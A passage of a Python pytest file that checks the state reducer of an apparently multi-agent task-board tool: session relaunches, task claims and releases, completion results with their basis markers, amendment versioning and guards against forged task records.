    store.apply(TaskClaimRequested(ROOT, request_id="k2"))

    assert store.snapshot().tasks["t1"].claimed_by == ROOT


# -- the same node id, spawned again --------------------------------------------
#
# A session resumed inside one pptmstr process announces itself under the node id
# of the session it continues. These two state what the reducer does with that
# today. They are measurements and not a specification: what a continued session
# should inherit is an open question in
# planning/2026-10-07-a-session-can-continue-under-a-different-mode.md (O3), and a
# decision there is expected to change these assertions.


def test_spawning_a_root_that_already_exists_replaces_its_record_and_keeps_its_children() -> None:
    """
    ``AgentSpawned`` assigns the node's record without consulting the one it has.

    The relaunch's transcript is the only one the snapshot then holds, and the
    usage, the end time and the start time are the new launch's. Nothing is done to
    the rest of the subtree: a sub-agent of the earlier process is still a node
    under this root, in the state it was last reported in.
    """
    before, after = Transcript(), Transcript()
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), transcript=before))
    store.apply(spawn(CHILD, parent=ROOT))
    store.apply(StateChanged(CHILD, AgentState.THINKING))
    store.apply(UsageAccrued(ROOT, UsageRollup(input_tokens=100, output_tokens=50)))
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=5.0))

    store.apply(dataclasses.replace(spawn(ROOT, at=9.0), transcript=after))

    snap = store.snapshot()
    root = snap.nodes[ROOT]
    assert root.transcript is after
    assert all(rec.transcript is not before for rec in snap.nodes.values())
    assert root.state is AgentState.SPAWNING
    assert (root.started_at, root.ended_at) == (9.0, None)
    assert root.usage == UsageRollup()

    child = snap.nodes[CHILD]
    assert child.parent == ROOT
    assert child.state is AgentState.THINKING
    assert snap.order == (ROOT, CHILD)
    # The orphan counts as work in progress, so the application does not idle.
    assert snap.any_active


def test_a_task_claimed_by_a_subagent_stays_claimed_by_it_when_its_root_is_spawned_again() -> None:
    """
    The board is keyed by session id and the relaunch does not touch it.

    The declared tasks are still on the continued session's board. A task held
    by a sub-agent stays CLAIMED by that node, and while the store still has
    that sub-agent as running the continued root can neither claim the task nor
    release it: the earlier run has not finished ending, and an agent that has
    not ended is nobody's to take work from (``Snapshot.of_earlier_run``).
    """
    store = _two_tasks()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, parent=ROOT))
    store.apply(TaskClaimRequested(CHILD, request_id="k1", task_id="t1"))
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=5.0))

    store.apply(spawn(ROOT, at=9.0))

    tasks = store.snapshot().tasks
    assert all(task.belongs_to(ROOT[0]) for task in tasks.values())
    assert (tasks["t1"].state, tasks["t1"].claimed_by) == (TaskState.CLAIMED, CHILD)

    claim = store.apply(TaskClaimRequested(ROOT, request_id="k2", task_id="t1"))
    assert claim == (ClaimSettled(request_id="k2", task=None, refusal=ClaimRefusal.HELD),)
    release = store.apply(TaskReleased(ROOT, "t1", request_id="k3"))
    assert [getattr(effect, "refusal", None) for effect in release] == [TaskRefusal.NOT_YOURS]
    assert store.snapshot().tasks["t1"].claimed_by == CHILD

    # Everything nobody held is still there to take.
    store.apply(TaskClaimRequested(ROOT, request_id="k4"))
    assert store.snapshot().tasks["t2"].claimed_by == ROOT


def test_a_late_end_from_the_run_a_relaunch_replaced_finishes_the_relaunched_record() -> None:
    """
    The reducer attributes an intent by node id, and two runs of one id share it.

    A closed run reports DONE while it unwinds. Applied after the relaunch's
    announce, that end lands on the relaunch's record, and a declared end is final:
    the live session's next ``StateChanged`` is dropped and it reads as finished.
    The reducer cannot tell the two runs apart, so the order is the emitter's to
    keep -- ``SessionPool`` holds a relaunch's announce until the run before it has
    ended.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(ROOT, at=9.0))
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=10.0))
    store.apply(StateChanged(ROOT, AgentState.THINKING))

    root = store.snapshot().nodes[ROOT]
    assert root.state is AgentState.DONE
    assert (root.started_at, root.ended_at) == (9.0, 10.0)

    # The order the pool keeps: the replaced run's end, then the announce.
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=10.0))
    store.apply(spawn(ROOT, at=11.0))
    store.apply(StateChanged(ROOT, AgentState.THINKING))

    root = store.snapshot().nodes[ROOT]
    assert root.state is AgentState.THINKING
    assert root.ended_at is None


# -- a finished task carries its result ---------------------------------------------
#
# Driven through ``_apply`` rather than a ``Store``: the property is the reducer's,
# and the arm that holds it is a pure function of the snapshot and the intent.

_LEAD: NodeId = ("sess-r", None)
_DEV: NodeId = ("sess-r", "agent-dev")
_QA: NodeId = ("sess-r", "agent-qa")


def _reduced(*intents: object) -> Snapshot:
    from pptmstr.store import _apply

    snap = Snapshot.empty()
    for at, intent in enumerate(intents):
        snap, _ = _apply(snap, intent, float(at))  # type: ignore[arg-type]
    return snap


def _claimed_by_dev(task: Task | None = None) -> tuple[object, object]:
    return (
        TaskDeclared(task or Task(id="t1", title="do t1"), node_id=_LEAD),
        TaskClaimRequested(_DEV, request_id="k1", task_id="t1"),
    )


def test_a_completion_puts_its_result_on_the_task() -> None:
    snap = _reduced(
        *_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, result="ran 12 tests; lint not run")
    )

    done = snap.tasks["t1"]
    assert done.state is TaskState.COMPLETED
    assert done.result == "ran 12 tests; lint not run"


def test_a_completion_with_no_result_is_the_record_it_always_was() -> None:
    """
    The off path, compared as a whole record rather than field by field: a
    completion that says nothing must leave exactly what a completion left before
    the field existed, with the new field at its default.
    """
    before = _reduced(*_claimed_by_dev()).tasks["t1"]
    after = _reduced(*_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0)).tasks["t1"]

    assert after == dataclasses.replace(before, state=TaskState.COMPLETED, completed_at=3.0)
    assert after.result == ""


def test_a_result_is_not_taken_from_a_node_that_does_not_hold_the_task() -> None:
    """
    The hazard is a result attributed to work its author did not do. The intruder's
    text has to be supplied for this to mean anything: a refused completion that
    carried no result would leave the field empty whether or not the guard covers it.
    """
    snap = _reduced(*_claimed_by_dev(), TaskCompleted(_QA, "t1", at=3.0, result="done, trust me"))

    assert snap.tasks["t1"].state is TaskState.CLAIMED
    assert snap.tasks["t1"].result == ""


def test_a_result_cannot_be_rewritten_once_the_task_is_complete() -> None:
    """
    COMPLETED is terminal, which is why nothing has to clear a result. A second
    completion is refused as ALREADY_COMPLETE, and it must be refused whole -- by
    the owner as much as by anyone else.
    """
    snap = _reduced(
        *_claimed_by_dev(),
        TaskCompleted(_DEV, "t1", at=3.0, result="the first account"),
        TaskCompleted(_DEV, "t1", at=4.0, result="a second thought"),
        TaskCompleted(_QA, "t1", at=5.0, result="somebody else's"),
    )

    assert snap.tasks["t1"].result == "the first account"
    assert snap.tasks["t1"].completed_at == 3.0


def test_a_declaration_cannot_arrive_carrying_a_result() -> None:
    """
    The completion arm is the field's one writer. ``TaskDeclared`` is handed a whole
    ``Task``, so a record built with a result already on it is the adversarial
    input, and it has to land blank.
    """
    forged = Task(id="t1", title="do t1", result="already done, nothing to see")
    snap = _reduced(TaskDeclared(forged, node_id=_LEAD))

    assert snap.tasks["t1"].result == ""


def test_a_declaration_cannot_arrive_claimed_finished_or_declined() -> None:
    """
    Each of these has one writer -- the claim arm, the completion arm, the release
    arm, the write sensor -- and a declaration is none of them. The adversarial
    input is a record with every one already set: it has to land as a task nobody
    has touched, and stay claimable.
    """
    forged = Task(
        id="t1",
        title="do t1",
        state=TaskState.COMPLETED,
        claimed_by=_DEV,
        completed_at=9.0,
        released_by=(_QA,),
        released_at=5.0,
        writes=ApprovedWrites(paths=("a.py",), lines_added=3),
        superseded=(TaskVersion("an earlier text", "", None, replaced_at=1.0),),
        claimed_version=4,
        held_by=(_LEAD,),
    )
    snap = _reduced(TaskDeclared(forged, node_id=_LEAD))

    assert snap.tasks["t1"] == Task(id="t1", title="do t1", declared_by=_LEAD)

    claimed = _reduced(
        TaskDeclared(forged, node_id=_LEAD),
        TaskClaimRequested(_QA, request_id="k1", task_id="t1"),
    )
    assert (claimed.tasks["t1"].state, claimed.tasks["t1"].claimed_by) == (TaskState.CLAIMED, _QA)


def test_amending_a_finished_task_keeps_what_was_reported() -> None:
    """An amendment rewrites what was asked. What was reported is not its to change."""
    snap = _reduced(
        *_claimed_by_dev(),
        TaskCompleted(_DEV, "t1", at=3.0, result="built as specified"),
        TaskAmended("t1", detail="a different specification"),
    )

    assert snap.tasks["t1"].detail == "a different specification"
    assert snap.tasks["t1"].result == "built as specified"


def test_a_released_task_has_no_result_for_its_next_owner_to_inherit() -> None:
    """
    Release is the one way a task changes hands, and it happens only before
    completion -- so the next owner starts from a blank result by construction.
    Pinned because it is the reason no arm clears the field.
    """
    snap = _reduced(
        *_claimed_by_dev(),
        TaskReleased(_DEV, "t1"),
        TaskClaimRequested(_QA, request_id="k2", task_id="t1"),
    )

    assert snap.tasks["t1"].claimed_by == _QA
    assert snap.tasks["t1"].result == ""


def test_a_result_reaches_the_board_read_the_reducer_answers() -> None:
    """
    Stored is not delivered. The reply to ``BoardRead`` is built from the snapshot
    by the same arm table, and a result the projection dropped would be on the
    record and in front of nobody.
    """
    from pptmstr.effects import BoardDelivered
    from pptmstr.intents import BoardRead
    from pptmstr.store import _apply

    snap = _reduced(*_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, result="ran it"))
    _, effects = _apply(snap, BoardRead(_QA, request_id="b1"), 9.0)

    (delivered,) = effects
    assert isinstance(delivered, BoardDelivered)
    assert [(t.id, t.result) for t in delivered.tasks] == [("t1", "ran it")]


# -- how an author says it knows ----------------------------------------------------
#
# The reducer stores the marker as given and derives nothing from it. What these pin
# is where it may come from and when it has to go.


def test_a_declaration_keeps_the_basis_its_declarer_gave_and_invents_none() -> None:
    snap = _reduced(
        TaskDeclared(Task(id="t1", title="x", detail="d", basis=Basis.RELAYED), node_id=_LEAD),
        TaskDeclared(Task(id="t2", title="x", detail="d"), node_id=_LEAD),
    )

    assert snap.tasks["t1"].basis is Basis.RELAYED
    assert snap.tasks["t2"].basis is None


def test_a_concern_keeps_the_basis_its_sender_gave_through_an_operators_edit() -> None:
    """
    The edit changes the body and marks it edited; the sender's statement about
    what it wrote stays the sender's, and the two are read together.
    """
    from pptmstr.intents import ConcernEdited, ConcernPosted

    def posted(cid: str, basis: Basis | None) -> ConcernPosted:
        return ConcernPosted(
            _QA,
            Concern(
                id=cid,
                sender=_QA,
                recipient=_DEV,
                subject="s",
                body="b",
                posted_at=1.0,
                basis=basis,
            ),
        )

    snap = _reduced(
        posted("c1", Basis.READ), posted("c2", None), ConcernEdited("c1", body="rewritten")
    )

    assert (snap.concerns["c1"].basis, snap.concerns["c1"].edited) == (Basis.READ, True)
    assert snap.concerns["c2"].basis is None


def test_a_results_basis_is_the_claimers_and_the_specifications_stays_the_declarers() -> None:
    """
    Two texts, two authors, two standings. A specification relayed from a reviewer
    and completed by a builder that ran it is the ordinary case, and a single
    shared field would have the completion promote the specification to RUN.
    """
    snap = _reduced(
        *_claimed_by_dev(Task(id="t1", title="x", detail="d", basis=Basis.RELAYED)),
        TaskCompleted(_DEV, "t1", at=3.0, result="ran it", basis=Basis.RUN),
    )

    assert snap.tasks["t1"].basis is Basis.RELAYED
    assert snap.tasks["t1"].result_basis is Basis.RUN


def test_a_basis_with_no_result_to_qualify_is_not_kept() -> None:
    snap = _reduced(*_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, basis=Basis.RUN))

    assert snap.tasks["t1"].state is TaskState.COMPLETED
    assert snap.tasks["t1"].result_basis is None


def test_a_result_of_nothing_but_whitespace_is_stored_as_no_result() -> None:
    """
    The bus strips before it emits, and it is not the only emitter. A blank the
    reducer kept would be a result every surface tests for truth and finds: a
    heading over nothing, and a basis vouching for it.
    """
    snap = _reduced(
        *_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, result=" \n\t ", basis=Basis.RUN)
    )

    assert snap.tasks["t1"].state is TaskState.COMPLETED
    assert snap.tasks["t1"].result == ""
    assert snap.tasks["t1"].result_basis is None


def test_a_refused_completion_leaves_no_basis_behind() -> None:
    snap = _reduced(
        *_claimed_by_dev(), TaskCompleted(_QA, "t1", at=3.0, result="done", basis=Basis.RUN)
    )

    assert snap.tasks["t1"].result_basis is None


def test_a_declaration_cannot_arrive_already_vouching_for_a_result() -> None:
    forged = Task(id="t1", title="x", result="done", result_basis=Basis.RUN)
    snap = _reduced(TaskDeclared(forged, node_id=_LEAD))

    assert snap.tasks["t1"].result_basis is None


def test_an_amended_specification_no_longer_carries_its_declarers_basis() -> None:
    """
    The hazard is the board showing a standing stronger than its author stated.
    After an amendment the text is the operator's and the operator stated none, so
    "says: run" over it would be the declarer vouching for words it did not write.
    The result's basis is about a different text and stays.
    """
    snap = _reduced(
        *_claimed_by_dev(Task(id="t1", title="x", detail="measured: 81 frames", basis=Basis.RUN)),
        TaskCompleted(_DEV, "t1", at=3.0, result="ran it", basis=Basis.READ),
        TaskAmended("t1", detail="a different specification"),
    )

    assert snap.tasks["t1"].basis is None
    assert snap.tasks["t1"].result_basis is Basis.READ


@pytest.mark.parametrize("held_to", [None, "a new sentence.", ""])
def test_an_amendment_that_leaves_the_specification_as_it_was_keeps_its_basis(
    held_to: str | None,
) -> None:
    """
    The basis goes with the text it described, so it stays while that text does.
    An amendment that changed only the property -- or nothing -- replaced no word
    the declarer wrote, and "basis unstated" over them would erase the one warning
    the declarer did give.
    """
    snap = _reduced(
        TaskDeclared(
            Task(id="t1", title="x", detail="as the reviewer put it", basis=Basis.RELAYED),
            node_id=_LEAD,
        ),
        TaskAmended("t1", detail="as the reviewer put it", property=held_to),
    )

    assert snap.tasks["t1"].basis is Basis.RELAYED
    assert snap.tasks["t1"].property == (held_to or "")


def test_an_amendment_that_changes_one_character_of_the_specification_drops_its_basis() -> None:
    snap = _reduced(
        TaskDeclared(Task(id="t1", title="x", detail="81 frames", basis=Basis.RUN), node_id=_LEAD),
        TaskAmended("t1", detail="81 frames "),
    )

    assert snap.tasks["t1"].basis is None


# -- a property, what was not run, and an incident ----------------------------------
#
# Each is stored by the arm that owns its record and by no other. What these pin is
# when each survives: a property through an amendment that did not mention it, a
# list of what was not run only from the claimer, an incident mark through an
# operator's edit.

_HELD = "A row is never dropped to make the board fit."


def test_a_declared_property_lands_on_the_task_as_one_line() -> None:
    snap = _reduced(
        TaskDeclared(Task(id="t1", title="x", property="  never\n lose a row. "), node_id=_LEAD),
        TaskDeclared(Task(id="t2", title="x"), node_id=_LEAD),
    )

    assert snap.tasks["t1"].property == "never lose a row."
    assert snap.tasks["t2"].property == ""


def test_amending_the_specification_leaves_the_property_it_did_not_mention() -> None:
    """
    The existing ``TaskAmended(task_id, detail)`` shape. The operator rewrote a
    paragraph; the sentence the work is held to was approved at the declaration
    and is not withdrawn by silence.
    """
    snap = _reduced(
        TaskDeclared(Task(id="t1", title="x", detail="old", property=_HELD), node_id=_LEAD),
        TaskAmended("t1", detail="new"),
    )

    assert (snap.tasks["t1"].detail, snap.tasks["t1"].property) == ("new", _HELD)


@pytest.mark.parametrize(("given", "stored"), [("  a new\n one. ", "a new one."), ("", "")])
def test_an_amendment_that_carries_a_property_replaces_or_withdraws_it(
    given: str, stored: str
) -> None:
    snap = _reduced(
        TaskDeclared(Task(id="t1", title="x", detail="old", property=_HELD), node_id=_LEAD),
        TaskAmended("t1", detail="old", property=given),
    )

    assert snap.tasks["t1"].property == stored


def test_what_was_not_run_is_written_by_the_claimers_completion_and_nothing_else() -> None:
    """
    Three writers that must not be one: a declaration carrying a forged list, a
    completion from a node that does not hold the task, and the claimer's own.
    """
    forged = _reduced(TaskDeclared(Task(id="t1", title="x", not_run=""), node_id=_LEAD))
    stale = _reduced(*_claimed_by_dev(), TaskCompleted(_QA, "t1", at=3.0, not_run="the probe"))
    owned = _reduced(*_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, not_run="the probe"))

    assert forged.tasks["t1"].not_run is None
    assert stale.tasks["t1"].not_run is None
    assert owned.tasks["t1"].not_run == "the probe"


@pytest.mark.parametrize(
    ("result", "given", "stored"),
    [
        ("ran it", None, None),
        ("ran it", "", ""),
        ("ran it", "the probe", "the probe"),
        # "Nothing my result names was left unrun" with no result names nothing.
        ("", "", None),
        ("", "the probe", "the probe"),
        ("", None, None),
        # A result of nothing but whitespace is no result, whoever built the intent.
        ("  \n\t", "", None),
        ("  \n\t", "the probe", "the probe"),
        # A list of nothing but whitespace names nothing and states nothing.
        ("ran it", " \n ", None),
        ("", " \n ", None),
    ],
)
def test_a_statement_that_nothing_was_left_unrun_is_kept_only_beside_a_result(
    result: str, given: str | None, stored: str | None
) -> None:
    snap = _reduced(
        *_claimed_by_dev(), TaskCompleted(_DEV, "t1", at=3.0, result=result, not_run=given)
    )

    assert snap.tasks["t1"].not_run == stored


def test_amending_a_finished_task_leaves_what_its_claimer_said_was_not_run() -> None:
    snap = _reduced(
        *_claimed_by_dev(),
        TaskCompleted(_DEV, "t1", at=3.0, result="ran it", not_run="the probe"),
        TaskAmended("t1", detail="a different specification"),
    )

    assert snap.tasks["t1"].not_run == "the probe"


def test_an_incident_mark_is_filed_as_given_and_survives_an_operators_edit() -> None:
    from pptmstr.intents import ConcernEdited, ConcernPosted

    def posted(cid: str, incident: bool) -> ConcernPosted:
        return ConcernPosted(
            _DEV,
            Concern(
                id=cid,
                sender=_DEV,
                recipient=_LEAD,
                subject="s",
                body="b",
                posted_at=1.0,
                incident=incident,
            ),
        )

    snap = _reduced(posted("c1", True), posted("c2", False), ConcernEdited("c1", body="softer"))

    assert (snap.concerns["c1"].incident, snap.concerns["c1"].body) == (True, "softer")
    assert snap.concerns["c2"].incident is False


def test_an_incident_is_delivered_exactly_as_an_ordinary_concern_is() -> None:
    """
    Nothing gates on the mark. Two concerns that differ only in it are waiting in
    the same inbox in posting order, and one read delivers both.
    """
    from pptmstr.effects import InboxDelivered
    from pptmstr.intents import ConcernPosted, InboxRead
    from pptmstr.model import ConcernState
    from pptmstr.store import _apply

    def posted(cid: str, at: float, incident: bool) -> ConcernPosted:
        return ConcernPosted(
            _DEV,
            Concern(
                id=cid,
                sender=_DEV,
                recipient=_LEAD,
                subject="s",
                body="b",
                posted_at=at,
                incident=incident,
            ),
        )

    snap = _reduced(posted("c1", 1.0, True), posted("c2", 2.0, False))
    assert [c.id for c in snap.inbox_of(_LEAD)] == ["c1", "c2"]

    after, effects = _apply(snap, InboxRead(_LEAD, request_id="r1", at=5.0), 5.0)
    (delivered,) = effects
    assert isinstance(delivered, InboxDelivered)
    assert [(c.id, c.incident) for c in delivered.concerns] == [("c1", True), ("c2", False)]
    assert {c.state for c in after.concerns.values()} == {ConcernState.DELIVERED}


# -- an amendment is a version ------------------------------------------------------
#
# Three things are pinned here. Who may replace a specification: the operator, and
# the agent that declared the task and has never held it -- and that such an agent
# may not afterwards claim it. That every text a task has had stays readable in
# order. And that a result names the version its author was handed, which is not
# always the one on the board when the result arrived.


def _amend(
    by: NodeId | None,
    detail: str | None,
    *,
    after: tuple[object, ...],
    property: str | None = None,
    basis: Basis | None = None,
    at: float | None = None,
) -> tuple[Snapshot, TaskRefusal | None, Snapshot]:
    """
    One amendment of t1, applied in a frame stamped 50 to the board the intents in
    ``after`` leave: that board, the refusal the amendment was answered with, and
    the board it left.
    """
    from pptmstr.effects import TaskWriteSettled
    from pptmstr.store import _apply

    before = _reduced(*after)
    amendment = TaskAmended(
        "t1", detail=detail, node_id=by, property=property, request_id="a1", at=at, basis=basis
    )
    landed, effects = _apply(before, amendment, 50.0)
    (settled,) = effects
    assert isinstance(settled, TaskWriteSettled) and settled.request_id == "a1"
    return before, settled.refusal, landed


_V1 = Task(id="t1", title="do t1", detail="first", property="never lose a row.", basis=Basis.RUN)


def _declared_v1() -> tuple[object, ...]:
    return (TaskDeclared(_V1, node_id=_LEAD),)


def test_an_amendment_keeps_the_text_it_replaced_with_who_replaced_it_and_when() -> None:
    _, refused, snap = _amend(None, "second", after=_declared_v1(), at=7.0)

    task = snap.tasks["t1"]
    assert refused is None
    assert (task.detail, task.version) == ("second", 2)
    assert task.superseded == (
        TaskVersion("first", "never lose a row.", Basis.RUN, replaced_at=7.0, replaced_by=None),
    )
    assert (task.amended_at, task.amended_by) == (7.0, None)


def test_an_amendment_with_no_clock_of_its_own_is_stamped_by_the_frame() -> None:
    _, _, snap = _amend(None, "second", after=_declared_v1())

    assert snap.tasks["t1"].amended_at == 50.0


def test_the_declarer_may_amend_a_task_it_does_not_hold_and_states_its_own_basis() -> None:
    """
    While another agent holds it, which is the case amendment exists for. The
    standing on the new text is the amender's; the claim is not disturbed.
    """
    _, refused, snap = _amend(_LEAD, "second", after=_claimed_by_dev(_V1), basis=Basis.READ)

    task = snap.tasks["t1"]
    assert refused is None
    assert (task.detail, task.basis, task.amended_by) == ("second", Basis.READ, _LEAD)
    assert (task.state, task.claimed_by) == (TaskState.CLAIMED, _DEV)


@pytest.mark.parametrize("amender", [_DEV, _QA], ids=["the holder", "a third agent"])
def test_an_agent_that_did_not_declare_a_task_cannot_amend_it(amender: NodeId) -> None:
    """
    The holder is the adversarial one: it is the agent the specification binds.
    """
    before, refused, after = _amend(amender, "easier", after=_claimed_by_dev(_V1), property="")

    assert refused is TaskRefusal.NOT_THE_DECLARER
    assert after.tasks["t1"] is before.tasks["t1"]


@pytest.mark.parametrize(
    "then",
    [
        (),
        (TaskCompleted(_LEAD, "t1", at=3.0, result="built"),),
        (TaskReleased(_LEAD, "t1"),),
    ],
    ids=["holds it", "finished it", "gave it back"],
)
def test_the_declarer_cannot_amend_a_task_it_holds_or_has_held(then: tuple[object, ...]) -> None:
    """
    The release is the one that matters: release, amend, claim again by id is three
    calls that would otherwise rewrite the specification an agent is working to,
    with the guard looking away at exactly the middle one.
    """
    held = (*_declared_v1(), TaskClaimRequested(_LEAD, request_id="k1", task_id="t1"), *then)
    before, refused, after = _amend(_LEAD, "easier", after=held, property="")

    assert refused is TaskRefusal.AMENDER_HELD_IT
    assert after.tasks["t1"] is before.tasks["t1"]


def test_an_operators_amendment_does_not_make_a_past_holder_eligible_to_amend() -> None:
    """
    An amendment empties ``released_by``, the operator's included. A guard that
    read "has held" off that list would forget the declarer ever held the task at
    exactly this point, and so would one that looked only at who holds it now.
    """
    held = (
        *_declared_v1(),
        TaskClaimRequested(_LEAD, request_id="k1", task_id="t1"),
        TaskReleased(_LEAD, "t1"),
        TaskAmended("t1", detail="the operator's"),
        TaskClaimRequested(_DEV, request_id="k2", task_id="t1"),
    )
    before, refused, after = _amend(_LEAD, "third", after=held)

    assert (before.tasks["t1"].released_by, before.tasks["t1"].claimed_by) == ((), _DEV)
    assert before.tasks["t1"].held_by == (_LEAD, _DEV)
    assert refused is TaskRefusal.AMENDER_HELD_IT
    assert after.tasks["t1"] is before.tasks["t1"]


def _claim(snap: Snapshot, by: NodeId, task_id: str | None = "t1") -> tuple[Snapshot, Task | None]:
    from pptmstr.store import _apply

    after, effects = _apply(snap, TaskClaimRequested(by, request_id="k9", task_id=task_id), 70.0)
    (settled,) = effects
    assert isinstance(settled, ClaimSettled)
    return after, settled.task


@pytest.mark.parametrize("task_id", ["t1", None], ids=["by id", "bare"])
def test_an_agent_that_amended_a_task_cannot_then_claim_it_and_another_agent_can(
    task_id: str | None,
) -> None:
    """
    Amend first, claim second is the other way round the same rule. The operator's
    later amendment does not clear it either: the lead still wrote a version.
    """
    _, refused, snap = _amend(_LEAD, "second", after=_declared_v1())
    snap = _reduced_from(snap, TaskAmended("t1", detail="third"))

    turned_away, nothing = _claim(snap, _LEAD, task_id)
    taken, won = _claim(snap, _DEV, task_id)

    assert refused is None
    assert nothing is None and turned_away.tasks["t1"] is snap.tasks["t1"]
    assert won is not None and taken.tasks["t1"].claimed_by == _DEV


def test_a_declarer_whose_amendment_changed_nothing_has_not_amended_and_may_claim() -> None:
    _, refused, snap = _amend(_LEAD, "first", after=_declared_v1())
    _, won = _claim(snap, _LEAD)

    assert refused is None and snap.tasks["t1"].superseded == ()
    assert won is not None and won.claimed_version == 1


def test_a_declarer_may_still_claim_a_task_as_it_declared_it() -> None:
    """
    The rule is about a specification replaced, not about declaring: a lead that
    keeps a task for itself is ordinary.
    """
    _, won = _claim(_reduced(*_declared_v1()), _LEAD)

    assert won is not None and won.held_by == (_LEAD,)


def test_everyone_who_ever_claimed_a_task_is_remembered_once_each_in_order() -> None:
    snap = _reduced(
        *_claimed_by_dev(_V1),
        TaskReleased(_DEV, "t1"),
        TaskClaimRequested(_QA, request_id="k2", task_id="t1"),
        TaskReleased(_QA, "t1"),
        TaskAmended("t1", detail="second"),
        TaskClaimRequested(_DEV, request_id="k3", task_id="t1"),
        TaskCompleted(_DEV, "t1", at=9.0),
    )

    assert snap.tasks["t1"].held_by == (_DEV, _QA)


def test_a_task_with_no_recorded_declarer_is_on_no_agents_board_and_the_operator_amends_it() -> (
    None
):
    undeclared = (TaskDeclared(_V1, node_id=None),)

    _, by_agent, _ = _amend(_LEAD, "second", after=undeclared)
    _, by_operator, snap = _amend(None, "second", after=undeclared)

    assert by_agent is TaskRefusal.NO_SUCH_TASK
    assert by_operator is None and snap.tasks["t1"].version == 2


def test_an_agent_amending_another_sessions_task_is_told_what_an_unknown_id_is_told() -> None:
    """
    The id is on a board the asker was never shown. "You did not declare it"
    would confirm that it exists there, which no other answer about a task does.
    """
    stranger: NodeId = ("sess-elsewhere", None)

    before, refused, after = _amend(stranger, "theirs now", after=_declared_v1())
    _, unknown, _ = _amend(stranger, "theirs now", after=())

    assert refused is unknown is TaskRefusal.NO_SUCH_TASK
    assert after.tasks["t1"] is before.tasks["t1"]


def test_an_amendment_that_sends_no_text_leaves_the_text_and_its_basis_standing() -> None:
    """
    A property-only amendment. The text is the store's, as it stands when the
    amendment is applied -- including an operator's rewrite that landed after
    the amender last read it, which a text sent back would have reverted.
    """
    rewritten = (*_declared_v1(), TaskAmended("t1", detail="the operator's text"))

    _, refused, snap = _amend(_LEAD, None, after=rewritten, property="never lose two.", at=7.0)

    task = snap.tasks["t1"]
    assert refused is None
    assert (task.detail, task.property, task.version) == (
        "the operator's text",
        "never lose two.",
        3,
    )
    assert task.superseded[-1] == TaskVersion(
        "the operator's text", "never lose a row.", None, replaced_at=7.0, replaced_by=_LEAD
    )


def test_an_amendment_that_sends_neither_text_nor_property_is_not_a_version() -> None:
    before, refused, after = _amend(_LEAD, None, after=_declared_v1(), basis=Basis.READ)

    assert refused is None
    assert (after.tasks["t1"].version, after.tasks["t1"].basis) == (1, Basis.RUN)
    assert after.tasks["t1"].detail == before.tasks["t1"].detail


def test_an_amendment_that_changes_nothing_is_not_a_version() -> None:
    """
    The editor sends the box touched or not. No version, the basis its author gave
    stays -- the amender's own is about no text of the amender's -- and the task is
    back in circulation for the agent that declined it, as before.
    """
    released = (*_claimed_by_dev(_V1), TaskReleased(_DEV, "t1"))
    before, refused, after = _amend(
        _LEAD, "first", after=released, property="never  lose a row.", basis=Basis.READ
    )

    assert before.tasks["t1"].released_by == (_DEV,)
    assert refused is None
    assert after.tasks["t1"].superseded == ()
    assert (after.tasks["t1"].version, after.tasks["t1"].basis) == (1, Basis.RUN)
    assert after.tasks["t1"].released_by == ()


@pytest.mark.parametrize("held_to", ["a new sentence.", ""])
def test_replacing_only_the_property_is_a_version_and_keeps_the_basis_of_the_text(
    held_to: str,
) -> None:
    """
    The property is the part of a specification the work is held to, so the one it
    used to state has to stay readable. The text beside it was not replaced, and
    neither is what its author said about it.
    """
    _, _, snap = _amend(_LEAD, "first", after=_declared_v1(), property=held_to, basis=Basis.READ)

    task = snap.tasks["t1"]
    assert (task.version, task.property, task.basis) == (2, held_to, Basis.RUN)
    assert [(v.detail, v.property) for v in task.superseded] == [("first", "never lose a row.")]


def test_a_result_names_the_version_its_author_was_handed_not_the_one_it_landed_on() -> None:
    """
    The case amendment exists for. The claimer was handed version one, the
    specification was replaced twice while it worked, and it finished without
    reading either. "Completed against version three" would be the board vouching
    for a reading that never happened.
    """
    snap = _reduced(
        *_claimed_by_dev(_V1),
        TaskAmended("t1", detail="second", node_id=_LEAD),
        TaskAmended("t1", detail="third"),
        TaskCompleted(_DEV, "t1", at=9.0, result="built"),
    )

    assert (snap.tasks["t1"].version, snap.tasks["t1"].completed_version) == (3, 1)


def test_amending_a_finished_task_leaves_its_result_against_the_version_it_was_written_to() -> None:
    snap = _reduced(
        *_declared_v1(),
        TaskAmended("t1", detail="second"),
        TaskClaimRequested(_DEV, request_id="k1", task_id="t1"),
        TaskCompleted(_DEV, "t1", at=9.0, result="built"),
        TaskAmended("t1", detail="third"),
    )

    task = snap.tasks["t1"]
    assert (task.version, task.completed_version) == (3, 2)
    assert task.superseded[task.completed_version - 1].detail == "second"


def test_a_task_nobody_finished_has_no_completed_version_and_a_release_forgets_the_claim() -> None:
    claimed = _reduced(*_claimed_by_dev(_V1))
    released = _reduced_from(claimed, TaskReleased(_DEV, "t1"))
    again = _reduced_from(
        released,
        TaskAmended("t1", detail="second"),
        TaskClaimRequested(_QA, request_id="k2", task_id="t1"),
    )

    assert (claimed.tasks["t1"].claimed_version, claimed.tasks["t1"].completed_version) == (1, None)
    assert released.tasks["t1"].claimed_version is None
    assert again.tasks["t1"].claimed_version == 2


def test_a_holder_shown_a_later_version_completes_against_that_one() -> None:
    snap = _reduced(
        *_claimed_by_dev(_V1),
        TaskAmended("t1", detail="second"),
        TaskAmended("t1", detail="third"),
        TaskVersionHanded(_DEV, "t1", version=2),
        TaskCompleted(_DEV, "t1", at=9.0, result="built"),
    )

    assert (snap.tasks["t1"].version, snap.tasks["t1"].completed_version) == (3, 2)


@pytest.mark.parametrize(
    ("who", "version"),
    [(_QA, 2), (_LEAD, 2), (_DEV, 4), (_DEV, 1)],
    ids=["another agent", "the amender", "a version it never had", "backwards"],
)
